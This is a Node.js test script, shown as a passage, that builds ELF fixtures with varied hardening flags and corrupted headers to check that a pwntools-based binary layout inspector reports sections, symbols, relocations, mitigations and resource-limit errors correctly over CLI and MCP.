#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  copyFile,
  mkdir,
  readFile,
  readdir,
  writeFile,
} from "node:fs/promises";
import { dirname, isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { sectionNameFixtures } from "./lib/elf-section-name-fixtures.mjs";
import { withLargeResultMcp } from "./lib/large-result-mcp.mjs";

const verifyLargeMcp = process.env.REA_VERIFY_LARGE_ELF_MCP === "1";
const python = process.env.REA_PWNTOOLS_PYTHON;
const strace = process.env.REA_VERIFY_STRACE_COMMAND;
if (
  process.platform !== "linux" ||
  process.arch !== "x64" ||
  !isAbsolute(python ?? "") ||
  !isAbsolute(strace ?? "")
)
  throw new Error(
    "verify:binary:layout requires Linux x64, absolute REA_PWNTOOLS_PYTHON (pwntools 4.15.0/pyelftools 0.33/Unicorn 2.1.2) and REA_VERIFY_STRACE_COMMAND. gcc, ld and strip must be available. No target is executed.",
  );
const run = createVerifierRun();
const execute = promisify(execFile);
for (const command of ["gcc", "ld", "strip", "/usr/bin/prlimit", strace]) {
  try {
    await execute(command, [command === strace ? "-V" : "--version"], {
      timeout: 10_000,
      maxBuffer: 1024 * 1024,
    });
  } catch (cause) {
    throw new Error(
      `verify:binary:layout prerequisite unavailable: ${command}`,
      { cause },
    );
  }
}
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const root = await PrivateRuntimeRoot.create({
  prefix: "rea-layout-verifier-",
});
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const client = new Client({ name: "binary-layout-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const source = fileURLToPath(
  new URL("./fixtures/binary-layout.c", import.meta.url),
);
const highSource = fileURLToPath(
  new URL("./fixtures/binary-layout-high.S", import.meta.url),
);
let cases = 0;
let bootstrapCases = 0;
const failures = [];
try {
  const bootstrapRoot = join(root.path, "bootstrap-boundary");
  await mkdir(bootstrapRoot);
  const bootstrapPath = join(bootstrapRoot, "layout.py");
  await copyFile(
    join(dirname(dirname(entrypoint)), "bridge/pwntools/layout.py"),
    bootstrapPath,
  );
  for (const [source, status] of [
    ["raise MemoryError('source-owned initialization failure')", 75],
    ["raise OSError(12, 'source-owned allocation failure')", 75],
    ["raise OSError(27, 'source-owned file write failure')", 76],
    [
      "raise OSError(2, 'MemoryError-like text is not an allocation failure')",
      1,
    ],
  ]) {
    await writeFile(join(bootstrapRoot, "layout_impl.py"), source);
    const markerPath = join(bootstrapRoot, `failure-${bootstrapCases}`);
    let exitCode = 0;
    try {
      await execute(
        python,
        ["-I", bootstrapPath, markerPath, "unused-request"],
        {
          timeout: 10000,
          maxBuffer: 1024 * 1024,
        },
      );
    } catch (cause) {
      assert.equal(typeof cause.code, "number");
      exitCode = cause.code;
    }
    assert.equal(exitCode, status);
    if (status === 75 || status === 76)
      assert.equal(
        await readFile(markerPath, "ascii"),
        status === 75 ? "M" : "F",
      );
    else await assert.rejects(readFile(markerPath), { code: "ENOENT" });
    bootstrapCases++;
  }
  for (const [name, flags] of [
    [
      "protected",
      [
        "-fPIE",
        "-pie",
        "-fstack-protector-all",
        "-Wl,-z,relro,-z,now",
        "-Wl,-z,noexecstack",
      ],
    ],
    [
      "plain",
      [
        "-fno-pie",
        "-no-pie",
        "-fno-stack-protector",
        "-Wl,-z,norelro",
        "-Wl,-z,execstack",
      ],
    ],
    ["relocatable", ["-c", "-fcommon", "-fPIC"]],
    ["library", ["-shared", "-fPIC", "-fno-stack-protector"]],
    ["packed-relative", ["-shared", "-fPIC", "-Wl,-z,pack-relative-relocs"]],
  ])
    await execute(
      "gcc",
      ["-O1", "-g", ...flags, source, "-o", join(root.path, name)],
      { timeout: 30_000, maxBuffer: 1024 * 1024 },
    );
  const sectionlessBytes = await readFile(join(root.path, "protected"));
  sectionlessBytes.writeBigUInt64LE(0n, 40);
  sectionlessBytes.writeUInt16LE(0, 60);
  sectionlessBytes.writeUInt16LE(0, 62);
  await writeFile(join(root.path, "sectionless"), sectionlessBytes);
  const nullBytes = Buffer.from(await readFile(join(root.path, "protected")));
  const phOffset = Number(nullBytes.readBigUInt64LE(32));
  const phSize = nullBytes.readUInt16LE(54);
  const phCount = nullBytes.readUInt16LE(56);
  const unusedIndex = Array.from({ length: phCount }, (_, index) => index).find(
    (index) => nullBytes.readUInt32LE(phOffset + index * phSize) === 0x6474e551,
  );
  assert.notEqual(
    unusedIndex,
    undefined,
    "Required stack fixture header absent",
  );
  const unusedHeader = phOffset + unusedIndex * phSize;
  nullBytes.writeUInt32LE(0, unusedHeader);
  for (const field of [8, 32, 40])
    nullBytes.writeBigUInt64LE(0xffffffffffffffffn, unusedHeader + field);
  await writeFile(join(root.path, "unused-segment"), nullBytes);
  const emptyBytes = Buffer.from(nullBytes);
  emptyBytes.writeUInt32LE(1, unusedHeader);
  emptyBytes.writeBigUInt64LE(0n, unusedHeader + 32);
  emptyBytes.writeBigUInt64LE(0n, unusedHeader + 40);
  await writeFile(join(root.path, "empty-segment"), emptyBytes);
  await copyFile(join(root.path, "protected"), join(root.path, "stripped"));
  await execute("strip", ["--strip-all", join(root.path, "stripped")], {
    timeout: 10_000,
  });
  await execute("gcc", ["-c", highSource, "-o", join(root.path, "high.o")], {
    timeout: 10_000,
  });
  await execute(
    "ld",
    [
      "-Ttext=0x20000000000001",
      "-o",
      join(root.path, "high"),
      join(root.path, "high.o"),
    ],
    { timeout: 10_000 },
  );
  await client.connect(transport);
  const reports = new Map();
  for (const name of [
    "protected",
    "plain",
    "relocatable",
    "library",
    "packed-relative",
    "stripped",
    "sectionless",
    "unused-segment",
    "empty-segment",
    "high",
  ]) {
    const path = join(root.path, name);
    const bytes = await readFile(path);
    const sha256 = createHash("sha256").update(bytes).digest("hex");
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, path);
      assert.equal(value.artifact.sha256, sha256);
      assert.equal(value.artifact.bytes, bytes.length);
      assert.equal(value.runtime_load_base, null);
      assert.equal(value.linkage.runtime_library_paths, null);
      assert.equal(value.mitigations.evidence_kind, "inferred");
      if (name === "sectionless") {
        assert.equal(value.sections.length, 0);
        assert.equal(value.symbols.length, 0);
        assert.deepEqual(
          value.linkage.needed_libraries,
          reports.get("protected").linkage.needed_libraries,
        );
        assert.ok(
          value.linkage.needed_libraries.every(
            (name) => name.location !== null && name.bytes_base64 !== null,
          ),
        );
        // Preserve the unchanged engine's section-dependent heuristic and its
        // explicit coverage limitation, rather than inventing a stronger label.
        assert.equal(value.mitigations.relro, "Partial");
        assert.ok(
          value.limitations.some((item) =>
            item.includes("RELRO/canary indicators may be incomplete"),
          ),
        );
      } else
        assert.ok(
          value.sections.some((section) => section.file_backing === "none"),
        );
      for (const section of value.sections) {
        assert.ok(typeof section.address === "string");
        if (section.file_backing === "file")
          assert.ok(
            BigInt(section.offset) + BigInt(section.size) <=
              BigInt(bytes.length),
          );
      }
      if (name === "unused-segment" || name === "empty-segment") {
        const segment = value.segments[unusedIndex];
        assert.equal(segment.file_backing, "none");
        assert.equal(segment.offset, "0xffffffffffffffff");
        if (name === "unused-segment") assert.equal(segment.permissions, null);
        else assert.notEqual(segment.permissions, null);
      }
      assert.equal(value.relocation_inventory_completeness, "unknown");
      if (name === "library" || name === "packed-relative") {
        assert.equal(value.entry_point.reported_value, "0x0");
        assert.equal(value.entry_point.meaning, "absent");
      }
      if (name === "packed-relative") {
        assert.ok(value.packed_relative_relocations.length > 0);
        for (const table of value.packed_relative_relocations) {
          assert.equal(table.evidence_kind, "derived");
          assert.equal(table.offset_meaning, "linked-virtual-address");
          assert.equal(table.entry_source_locations, null);
          assert.equal(table.addends, null);
          assert.ok(table.entries.length > 0);
          const start = Number(BigInt(table.location.offset));
          const length = Number(BigInt(table.location.bytes));
          assert.deepEqual(
            Buffer.from(table.encoded_bytes_base64, "base64"),
            bytes.subarray(start, start + length),
          );
        }
      }
      reports.set(name, value);
      assert.deepEqual(await readFile(path), bytes);
      cases++;
    }
  }
  const protectedReport = reports.get("protected");
  const fileSymbols = protectedReport.symbols.filter(
    (symbol) => symbol.type === "STT_FILE",
  );
  assert.ok(fileSymbols.length > 0);
  assert.ok(
    fileSymbols.every((symbol) => symbol.value_meaning === "no-address"),
  );
  const plain = reports.get("plain");
  assert.equal(protectedReport.mitigations.position_independent, true);
  assert.equal(protectedReport.mitigations.nx_indicator, true);
  assert.equal(protectedReport.mitigations.stack_canary_indicator, true);
  assert.equal(protectedReport.mitigations.relro, "Full");
  assert.equal(plain.mitigations.position_independent, false);
  assert.equal(plain.mitigations.nx_indicator, null);
  assert.equal(plain.mitigations.executable_stack_indicator, true);
  assert.equal(protectedReport.mitigations.executable_stack_indicator, false);
  assert.equal(plain.mitigations.stack_canary_indicator, false);
  assert.equal(plain.mitigations.relro, null);
  const relocatable = reports.get("relocatable");
  assert.equal(relocatable.entry_point.meaning, "not-applicable");
  assert.ok(relocatable.relocations.length > 0);
  assert.ok(
    relocatable.relocations.every(
      (item) => item.target.kind === "section-offset",
    ),
  );
  assert.ok(
    relocatable.relocations.some((item) => BigInt(item.addend ?? "0") < 0n),
  );
  assert.equal(
    relocatable.symbols.find((symbol) => symbol.name.display === "common_value")
      .value_meaning,
    "alignment",
  );
  assert.equal(
    reports
      .get("library")
      .symbols.find((symbol) => symbol.name.display === "tls_value")
      .value_meaning,
    "tls-offset",
  );
  assert.equal(
    reports.get("high").entry_point.reported_value,
    "0x20000000000001",
  );
  assert.equal(
    reports
      .get("high")
      .symbols.find((symbol) => symbol.name.display === "absolute_value").value,
    "0x20000000000007",
  );
  assert.equal(
    reports
      .get("high")
      .symbols.find((symbol) => symbol.name.display === "absolute_value")
      .value_meaning,
    "absolute-value",
  );
  assert.ok(
    reports.get("stripped").symbols.length < protectedReport.symbols.length,
  );
  const object = await readFile(join(root.path, "relocatable"));
  const name = relocatable.symbols.find(
    (symbol) => symbol.name.display === "read_values",
  ).name;
  const changed = Buffer.from(object);
  changed[Number(BigInt(name.location.offset))] = 0xff;
  const opaque = join(root.path, "opaque-name.o");
  await writeFile(opaque, changed);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, opaque);
    const symbol = value.symbols.find((item) =>
      item.name.display.endsWith("ead_values"),
    );
    assert.equal(Buffer.from(symbol.name.bytes_base64, "base64")[0], 0xff);
    assert.equal(symbol.name.location.offset, name.location.offset);
    assert.deepEqual(await readFile(opaque), changed);
    cases++;
  }
  const sectionBearingBytes = await readFile(join(root.path, "protected"));
  const dynamicSegment = protectedReport.segments.find(
    (segment) => segment.type === "PT_DYNAMIC",
  );
  const interpreterSegment = protectedReport.segments.find(
    (segment) => segment.type === "PT_INTERP",
  );
  assert.notEqual(dynamicSegment, undefined);
  assert.notEqual(interpreterSegment, undefined);
  const dependency = protectedReport.linkage.needed_libraries[0];
  assert.notEqual(dependency, undefined);
  assert.notEqual(dependency.location, null);
  for (const [profile, original] of [
    ["section-bearing", sectionBearingBytes],
    ["sectionless", sectionlessBytes],
  ]) {
    for (const facet of ["dependency", "interpreter"]) {
      const bytes = Buffer.from(original);
      const reference =
        facet === "dependency"
          ? dependency
          : protectedReport.linkage.interpreters[0];
      assert.notEqual(reference, undefined);
      assert.notEqual(reference.location, null);
      const raw = Buffer.from(reference.bytes_base64, "base64");
      const changedIndex = facet === "dependency" ? 0 : 1;
      raw[changedIndex] = 0xff;
      bytes[Number(BigInt(reference.location.offset)) + changedIndex] = 0xff;
      const path = join(root.path, `opaque-${profile}-${facet}`);
      await writeFile(path, bytes);
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, path);
        const actual =
          facet === "dependency"
            ? value.linkage.needed_libraries[0]
            : value.linkage.interpreters[0];
        assert.deepEqual(actual, {
          ...reference,
          display: raw.toString("utf8"),
          bytes_base64: raw.toString("base64"),
        });
        assert.equal(
          value.artifact.sha256,
          createHash("sha256").update(bytes).digest("hex"),
        );
        assert.deepEqual(await readFile(path), bytes);
        cases++;
      }
    }
  }
  for (const fixture of sectionNameFixtures(
    sectionBearingBytes,
    protectedReport,
  )) {
    const path = join(root.path, `section-names-${fixture.name}`);
    await writeFile(path, fixture.bytes);
    for (const mode of ["cli", "mcp"]) {
      if (
        fixture.expectation === "resolved" &&
        mode === "mcp" &&
        !verifyLargeMcp
      )
        continue;
      // Ordinary cases retain the SDK default. Only this complete 65,281-row
      // case selects a larger receive budget; production data is not truncated.
      const value =
        fixture.expectation === "resolved" && mode === "mcp"
          ? await withLargeResultMcp(
              { entrypoint, environment, maxBufferSize: 256 * 1024 * 1024 },
              (largeClient) =>
                inspect(mode, path, undefined, environment, largeClient),
            )
          : await inspect(
              mode,
              path,
              fixture.expectation === "invalid_input"
                ? "invalid_input"
                : undefined,
            );
      if (fixture.expectation === "absent") {
        assert.deepEqual(value.symbols, protectedReport.symbols);
        assert.deepEqual(
          value.sections.map((section) => section.name),
          protectedReport.sections.map(() => ({
            display: "",
            bytes_base64: null,
            location: null,
            unknown_reason:
              "ELF declares no section-name table (SHN_UNDEF index 0).",
          })),
        );
        assert.deepEqual(
          value.sections.map((section) => section.name_offset),
          protectedReport.sections.map((section) => section.name_offset),
        );
      } else if (fixture.expectation === "resolved") {
        assert.equal(value.sections.length, fixture.sectionCount);
        assert.deepEqual(
          value.sections[fixture.tableIndex].name,
          protectedReport.sections[sectionBearingBytes.readUInt16LE(62)].name,
        );
        assert.deepEqual(value.symbols, protectedReport.symbols);
      }
      cases++;
    }
    assert.deepEqual(await readFile(path), fixture.bytes);
  }
  // Malformed references must fail before the decoder reads unrelated bytes.
  const neededTagOffsets = [];
  let stringSizeTagOffset;
  for (
    let offset = Number(BigInt(dynamicSegment.offset));
    offset <
    Number(BigInt(dynamicSegment.offset) + BigInt(dynamicSegment.file_size));
    offset += 16
  ) {
    const tag = sectionBearingBytes.readBigUInt64LE(offset);
    if (tag === 0n) break;
    if (tag === 1n) neededTagOffsets.push(offset + 8);
    if (tag === 10n) stringSizeTagOffset = offset + 8;
  }
  assert.ok(neededTagOffsets.length > 0);
  assert.notEqual(stringSizeTagOffset, undefined);
  for (const [profile, original] of [
    ["section-bearing", sectionBearingBytes],
    ["sectionless", sectionlessBytes],
  ]) {
    for (const problem of ["offset-at-end", "truncated-table"]) {
      const bytes = Buffer.from(original);
      if (problem === "offset-at-end")
        bytes.writeBigUInt64LE(
          bytes.readBigUInt64LE(stringSizeTagOffset),
          neededTagOffsets[0],
        );
      else {
        assert.ok(bytes.readBigUInt64LE(neededTagOffsets[0]) > 0n);
        bytes.writeBigUInt64LE(1n, stringSizeTagOffset);
      }
      const path = join(root.path, `invalid-dependency-${profile}-${problem}`);
      await writeFile(path, bytes);
      for (const mode of ["cli", "mcp"]) {
        await inspect(mode, path, "invalid_input");
        cases++;
      }
      assert.deepEqual(await readFile(path), bytes);
    }
  }
  for (const type of ["SHT_SYMTAB", "SHT_DYNSYM"]) {
    const table = protectedReport.sections.find(
      (section) => section.type === type,
    );
    const other = protectedReport.sections.find(
      (section) => section.type === "SHT_PROGBITS",
    );
    assert.notEqual(table, undefined);
    assert.notEqual(other, undefined);
    const header = Number(BigInt(table.header_location.offset));
    const strings = protectedReport.sections[table.link];
    assert.equal(strings.type, "SHT_STRTAB");
    for (const problem of [
      "out-of-range",
      "null",
      "wrong-type",
      "undeclared-header",
    ]) {
      let bytes = Buffer.from(sectionBearingBytes);
      let link =
        problem === "null"
          ? 0
          : problem === "wrong-type"
            ? other.index
            : protectedReport.sections.length + 100;
      if (problem === "undeclared-header") {
        // Upstream can read an otherwise valid header beyond declared e_shnum.
        const end =
          Number(bytes.readBigUInt64LE(40)) +
          protectedReport.sections.length * bytes.readUInt16LE(58);
        const extended = Buffer.alloc(Math.max(bytes.length, end + 64));
        bytes.copy(extended);
        const start = Number(BigInt(strings.header_location.offset));
        bytes.copy(extended, end, start, start + 64);
        bytes = extended;
        link = protectedReport.sections.length;
      }
      bytes.writeUInt32LE(link, header + 40);
      const path = join(root.path, `invalid-symbol-link-${type}-${problem}`);
      await writeFile(path, bytes);
      for (const mode of ["cli", "mcp"]) {
        await inspect(mode, path, "invalid_input");
        cases++;
      }
      assert.deepEqual(await readFile(path), bytes);
    }
  }
  const shortDynamic = Buffer.from(sectionBearingBytes);
  shortDynamic.writeBigUInt64LE(
    16n,
    Number(BigInt(dynamicSegment.header_location.offset)) + 32,
  );
  assert.notEqual(
    shortDynamic.readBigUInt64LE(Number(BigInt(dynamicSegment.offset))),
    0n,
  );
  const paddedInterpreter = Buffer.from(sectionBearingBytes);
  const interpreterStart = Number(BigInt(interpreterSegment.offset));
  paddedInterpreter[interpreterStart + 2] = 0;
  const paddedInterpreterPath = join(root.path, "padded-interpreter");
  await writeFile(paddedInterpreterPath, paddedInterpreter);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, paddedInterpreterPath);
    assert.deepEqual(value.linkage.interpreters, [
      {
        display: "/l",
        bytes_base64: Buffer.from("/l").toString("base64"),
        location: { offset: interpreterSegment.offset, bytes: "0x3" },
        unknown_reason: null,
      },
    ]);
    assert.equal(
      value.segments[interpreterSegment.index].file_size,
      interpreterSegment.file_size,
    );
    assert.deepEqual(await readFile(paddedInterpreterPath), paddedInterpreter);
    cases++;
  }
  const unterminatedInterpreter = Buffer.from(sectionBearingBytes);
  unterminatedInterpreter.fill(
    0x58,
    interpreterStart,
    interpreterStart + Number(BigInt(interpreterSegment.file_size)),
  );
  const zeroSymbolEntries = ["SHT_SYMTAB", "SHT_DYNSYM"].map((type) => {
    const section = protectedReport.sections.find((item) => item.type === type);
    assert.notEqual(
      section,
      undefined,
      `Required fixture table absent: ${type}`,
    );
    const bytes = Buffer.from(sectionBearingBytes);
    bytes.writeBigUInt64LE(
      0n,
      Number(BigInt(section.header_location.offset)) + 56,
    );
    return [`zero-entry-${type}`, bytes, "invalid_input"];
  });
  const undersizedSymbolEntries = ["SHT_SYMTAB", "SHT_DYNSYM"].map((type) => {
    const section = protectedReport.sections.find((item) => item.type === type);
    assert.notEqual(section, undefined);
    const bytes = Buffer.from(sectionBearingBytes);
    const header = Number(BigInt(section.header_location.offset));
    bytes.writeBigUInt64LE(8n, header + 32);
    bytes.writeBigUInt64LE(8n, header + 56);
    return [`undersized-entry-${type}`, bytes, "invalid_input"];
  });
  const relocationSection = relocatable.sections.find(
    (item) => item.type === "SHT_RELA",
  );
  assert.notEqual(relocationSection, undefined);
  const undersizedRelocationEntries = [
    ["REL", 9],
    ["RELA", 4],
  ].map(([type, sectionType]) => {
    const bytes = Buffer.from(object);
    const header = Number(BigInt(relocationSection.header_location.offset));
    bytes.writeUInt32LE(sectionType, header + 4);
    bytes.writeBigUInt64LE(8n, header + 32);
    bytes.writeBigUInt64LE(8n, header + 56);
    return [`undersized-entry-${type}`, bytes, "invalid_input"];
  });
  const invalidRelocationReferences = [
    ["missing-symbol-table", relocatable.sections.length + 100],
    ["wrong-symbol-table-kind", 1],
    ["positive-symbol-without-table", 0],
    ["missing-relocation-symbol", null],
  ].map(([name, link]) => {
    const bytes = Buffer.from(object);
    const header = Number(BigInt(relocationSection.header_location.offset));
    if (link === null) {
      const offset = Number(BigInt(relocationSection.offset)) + 8;
      const type = bytes.readBigUInt64LE(offset) & 0xffffffffn;
      bytes.writeBigUInt64LE((0xffffffffn << 32n) | type, offset);
    } else bytes.writeUInt32LE(link, header + 40);
    return [name, bytes, "invalid_input"];
  });
  const inactiveTarget = relocatable.sections.find(
    (section) => section.name.display === ".comment",
  );
  assert.notEqual(
    inactiveTarget,
    undefined,
    "Required inactive-target fixture absent",
  );
  for (const [name, targetIndex, reason] of [
    ["undefined-relocation-target", 0, "undefined-section-reference"],
    [
      "inactive-relocation-target",
      inactiveTarget.index,
      "inactive-section-header",
    ],
  ]) {
    const bytes = Buffer.from(object);
    bytes.writeUInt32LE(
      targetIndex,
      Number(BigInt(relocationSection.header_location.offset)) + 44,
    );
    if (targetIndex !== 0)
      bytes.writeUInt32LE(
        0,
        Number(BigInt(inactiveTarget.header_location.offset)) + 4,
      );
    const inactiveSymbol = relocatable.symbols.find(
      (symbol) => symbol.name.display === "read_values",
    );
    assert.notEqual(inactiveSymbol, undefined);
    if (targetIndex !== 0)
      bytes.writeUInt16LE(
        targetIndex,
        Number(BigInt(inactiveSymbol.location.offset)) + 6,
      );
    const path = join(root.path, name);
    await writeFile(path, bytes);
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, path);
      const rows = value.relocations.filter(
        (item) => item.section_index === relocationSection.index,
      );
      assert.ok(rows.length > 0);
      for (const row of rows)
        assert.deepEqual(row.target, {
          kind: "unknown-section",
          reported_section_index: targetIndex,
          offset: row.reported_offset,
          unknown_reason: reason,
        });
      if (targetIndex !== 0)
        assert.equal(
          value.symbols.find((symbol) => symbol.name.display === "read_values")
            .value_meaning,
          "unknown-section-index",
        );
      assert.deepEqual(await readFile(path), bytes);
      cases++;
    }
  }
  const relative = protectedReport.relocations.find(
    (item) => item.type === 8 && item.symbol_index === 0,
  );
  assert.notEqual(relative, undefined, "Required relative relocation absent");
  const relativeOwner = protectedReport.sections[relative.section_index];
  const noSymbolTable = Buffer.from(sectionBearingBytes);
  const relativeHeader = Number(BigInt(relativeOwner.header_location.offset));
  noSymbolTable.writeBigUInt64LE(
    BigInt(relative.location.offset),
    relativeHeader + 24,
  );
  noSymbolTable.writeBigUInt64LE(
    BigInt(relative.location.bytes),
    relativeHeader + 32,
  );
  noSymbolTable.writeUInt32LE(0, relativeHeader + 40);
  const zeroSymbolPath = join(root.path, "relative-without-symbol-table");
  await writeFile(zeroSymbolPath, noSymbolTable);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, zeroSymbolPath);
    const reported = value.relocations.find(
      (item) => item.section_index === relative.section_index,
    );
    assert.equal(reported.symbol_table_index, 0);
    assert.equal(reported.symbol_index, 0);
    assert.equal(reported.symbol_reference_meaning, "zero-symbol-value");
    assert.deepEqual(await readFile(zeroSymbolPath), noSymbolTable);
    cases++;
  }
  const undersizedProgramHeader = Buffer.from(sectionBearingBytes);
  const missingTargetSection = Buffer.from(object);
  missingTargetSection.writeUInt32LE(
    relocatable.sections.length + 100,
    Number(BigInt(relocationSection.header_location.offset)) + 44,
  );
  undersizedProgramHeader.writeUInt16LE(8, 54);
  undersizedProgramHeader.writeUInt16LE(1, 56);
  const symbolTable = relocatable.sections.find(
    (section) => section.type === "SHT_SYMTAB",
  );
  assert.notEqual(symbolTable, undefined);
  const symbol = relocatable.symbols.find(
    (item) => item.name.display === "read_values",
  );
  assert.notEqual(symbol, undefined);
  const extendedWords = Buffer.alloc(
    Number(BigInt(symbolTable.size) / BigInt(symbolTable.entry_size)) * 4,
  );
  extendedWords.writeUInt32LE(symbol.section_index, symbol.entry_index * 4);
  const headers = Buffer.from(
    object.subarray(
      Number(BigInt(relocatable.sections[0].header_location.offset)),
      Number(
        BigInt(relocatable.sections.at(-1).header_location.offset) +
          BigInt(relocatable.sections.at(-1).header_location.bytes),
      ),
    ),
  );
  const extendedHeader = Buffer.alloc(64);
  extendedHeader.writeUInt32LE(18, 4); // SHT_SYMTAB_SHNDX
  extendedHeader.writeBigUInt64LE(BigInt(object.length), 24);
  extendedHeader.writeBigUInt64LE(BigInt(extendedWords.length), 32);
  extendedHeader.writeUInt32LE(symbolTable.index, 40);
  extendedHeader.writeBigUInt64LE(4n, 48);
  extendedHeader.writeBigUInt64LE(4n, 56);
  const extendedObject = Buffer.concat([
    object,
    extendedWords,
    headers,
    extendedHeader,
  ]);
  extendedObject.writeBigUInt64LE(
    BigInt(object.length + extendedWords.length),
    40,
  );
  extendedObject.writeUInt16LE(relocatable.sections.length + 1, 60);
  extendedObject.writeUInt16LE(
    0xffff,
    Number(BigInt(symbol.location.offset)) + 6,
  );
  const extendedPath = join(root.path, "external-symbol-index.o");
  await writeFile(extendedPath, extendedObject);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, extendedPath);
    const reported = value.symbols.find(
      (item) => item.name.display === "read_values",
    );
    assert.equal(reported.section_index, 0xffff);
    assert.equal(reported.value_meaning, "unknown-section-index");
    assert.ok(
      value.sections.some((section) => section.type === "SHT_SYMTAB_SHNDX"),
    );
    assert.deepEqual(await readFile(extendedPath), extendedObject);
    cases++;
  }
  for (const [name, option, expected] of [
    ["address-space", "--as=2147483648", '"address_space_bytes": 2147483648'],
    ["cpu", "--cpu=20", '"cpu_seconds": 20'],
    ["file-size", "--fsize=33554432", '"file_size_bytes": 33554432'],
  ]) {
    const wrapper = join(root.path, `python-limit-${name}`);
    const quotedPython = "'" + python.replaceAll("'", "'\"'\"'") + "'";
    await writeFile(
      wrapper,
      `#!/bin/sh\nexec /usr/bin/prlimit ${option} -- ${quotedPython} "$@"\n`,
      { mode: 0o700 },
    );
    const limitedEnvironment = { ...environment, REA_PWNTOOLS_PYTHON: wrapper };
    const limitedClient = new Client({
      name: "limited-layout-verifier",
      version: "1",
    });
    const limitedTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: limitedEnvironment,
      stderr: "pipe",
    });
    try {
      await limitedClient.connect(limitedTransport);
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(
          mode,
          join(root.path, "protected"),
          undefined,
          limitedEnvironment,
          limitedClient,
        );
        assert.ok(value.limitations.some((item) => item.includes(expected)));
        cases++;
      }
    } finally {
      try {
        await limitedClient.close();
      } finally {
        await limitedTransport.close();
      }
    }
  }
  const unsupported = Buffer.from(object);
  const originalSectionOffset = Number(object.readBigUInt64LE(40));
  const sectionSize = object.readUInt16LE(58);
  const originalSectionCount = object.readUInt16LE(60);
  const sectionCount = 30000;
  const sectionOffset = Math.ceil(object.length / 8) * 8;
  const sectionHeavy = Buffer.alloc(sectionOffset + sectionCount * sectionSize);
  object.copy(sectionHeavy);
  object.copy(
    sectionHeavy,
    sectionOffset,
    originalSectionOffset,
    originalSectionOffset + originalSectionCount * sectionSize,
  );
  for (let index = originalSectionCount; index < sectionCount; index++) {
    sectionHeavy.writeUInt32LE(1, sectionOffset + index * sectionSize + 4);
    sectionHeavy.writeBigUInt64LE(1n, sectionOffset + index * sectionSize + 48);
  }
  sectionHeavy.writeBigUInt64LE(BigInt(sectionOffset), 40);
  sectionHeavy.writeUInt16LE(sectionCount, 60);
  const sectionHeavyPath = join(root.path, "section-heavy.o");
  await writeFile(sectionHeavyPath, sectionHeavy);
  const memoryWrapper = join(root.path, "python-memory-constraint");
  const quotedPython = "'" + python.replaceAll("'", "'\"'\"'") + "'";
  await writeFile(
    memoryWrapper,
    `#!/bin/sh\nexec /usr/bin/prlimit --as=100663296 -- ${quotedPython} "$@"\n`,
    { mode: 0o700 },
  );
  const memoryEnvironment = {
    ...environment,
    REA_PWNTOOLS_PYTHON: memoryWrapper,
  };
  const memoryClient = new Client({
    name: "memory-layout-verifier",
    version: "1",
  });
  const memoryTransport = new StdioClientTransport({
    command: process.execPath,
    args: [entrypoint, "mcp"],
    env: memoryEnvironment,
    stderr: "pipe",
  });
  try {
    await memoryClient.connect(memoryTransport);
    for (const mode of ["cli", "mcp"]) {
      const error = await inspect(
        mode,
        sectionHeavyPath,
        "resource_constraint",
        memoryEnvironment,
        memoryClient,
      );
      assert.equal(error.code, "resource_constraint");
      assert.equal(error.details.resource, "memory");
      assert.ok(
        error.details.reported_limits === null ||
          error.details.reported_limits.address_space_bytes === 100663296,
      );
      assert.equal(error.details.captured_output.truncated, false);
      assert.ok(error.remediation.action.includes("memory"));
      cases++;
    }
    assert.deepEqual(await readFile(sectionHeavyPath), sectionHeavy);
  } finally {
    try {
      await memoryClient.close();
    } finally {
      await memoryTransport.close();
    }
  }
  // Extended section numbering keeps this valid while providing enough work
  // to reach the one-second CPU limit even on faster CI runners.
  const cpuSectionCount = 300000;
  const cpuHeavy = Buffer.alloc(sectionOffset + cpuSectionCount * sectionSize);
  sectionHeavy.copy(cpuHeavy);
  for (let index = sectionCount; index < cpuSectionCount; index++) {
    cpuHeavy.writeUInt32LE(1, sectionOffset + index * sectionSize + 4);
    cpuHeavy.writeBigUInt64LE(1n, sectionOffset + index * sectionSize + 48);
  }
  cpuHeavy.writeUInt16LE(0, 60);
  cpuHeavy.writeBigUInt64LE(BigInt(cpuSectionCount), sectionOffset + 32);
  const cpuHeavyPath = join(root.path, "cpu-section-heavy.o");
  await writeFile(cpuHeavyPath, cpuHeavy);
  const cpuWrapper = join(root.path, "python-cpu-constraint");
  await writeFile(
    cpuWrapper,
    `#!/bin/sh\nexec /usr/bin/prlimit --cpu=1: --core=0: -- ${quotedPython} "$@"\n`,
    { mode: 0o700 },
  );
  const cpuEnvironment = { ...environment, REA_PWNTOOLS_PYTHON: cpuWrapper };
  const cpuClient = new Client({ name: "cpu-layout-verifier", version: "1" });
  const cpuTransport = new StdioClientTransport({
    command: process.execPath,
    args: [entrypoint, "mcp"],
    env: cpuEnvironment,
    stderr: "pipe",
  });
  try {
    await cpuClient.connect(cpuTransport);
    for (const mode of ["cli", "mcp"]) {
      const error = await inspect(
        mode,
        cpuHeavyPath,
        "resource_constraint",
        cpuEnvironment,
        cpuClient,
      );
